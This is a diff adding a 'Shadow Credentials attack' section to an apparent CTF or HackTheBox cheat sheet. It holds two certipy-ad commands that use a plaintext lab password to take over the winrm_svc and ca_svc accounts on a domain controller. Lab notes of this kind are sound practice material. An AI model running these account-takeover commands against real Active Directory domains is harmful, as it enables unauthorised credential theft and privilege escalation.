@@ -804,3 +804,18 @@ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51
 ```
   
 </details>
+
+---
+<details>
+  <summary><strong>GenericWrite</strong></summary>
+
+## Shadow Credentials attack 
+```bash
+# 다른 계정도 시도해보아야 한다 
+certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account 'winrm_svc' -dc-ip 10.129.232.88 -target-ip 10.129.232.88
+certipy-ad shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account 'ca_svc' -dc-ip 10.129.232.88 -target-ip 10.129.232.88
+
+```
+
+
+</details>
